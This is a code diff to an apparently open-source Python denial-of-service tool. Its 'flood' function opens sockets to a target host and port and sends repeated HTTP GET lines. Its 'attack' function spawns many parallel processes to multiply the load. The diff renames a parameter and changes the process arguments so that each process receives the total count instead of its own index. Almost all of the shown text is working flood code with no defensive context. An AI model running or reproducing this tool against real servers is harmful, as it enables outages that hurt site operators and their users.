@@ -27,18 +27,18 @@ THE SOFTWARE.
 import requests, os, sys, string, socket, threading, math, multiprocessing
 #import hanging_threads
 
-def flood(url, msg, rate, inst, port):
+def flood(url, instance, msg, rate, port):
 	try:
 		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		conn.connect((url, int(port),))
 		for i in range(0, int(rate)):
 			conn.send(("GET /" + str(msg) + " HTTP/1.1\r\n").encode())
-			print("[+] SOCKET OK: INST%s/RATE%s" % (str(inst), str(i)))
+			print("[+] SOCKET OK: INST%s/RATE%s" % (str(instance), str(i)))
 		conn.close()
 	except Exception as e:
 		print("[!] SOCKET EXCEPTION:", e)
 	else:
-		print("[+] INSTANCE %s OK" % str(inst))
+		print("[+] INSTANCE %s OK" % str(instance))
 
 def attack(url, instance, msg, rate, port):
 	try:
@@ -52,7 +52,7 @@ def attack(url, instance, msg, rate, port):
 		print("[+] CONNECTION ATTEMPT OK")
 		try:
 			for i in range(0, int(instance)):
-				p = multiprocessing.Process(target=flood, args=(url, msg, rate, i, port,))
+				p = multiprocessing.Process(target=flood, args=(url, instance, msg, rate, port,))
 				p.start()
 				print("[+] INSTANCE INIT:", i)
 		except Exception as e:
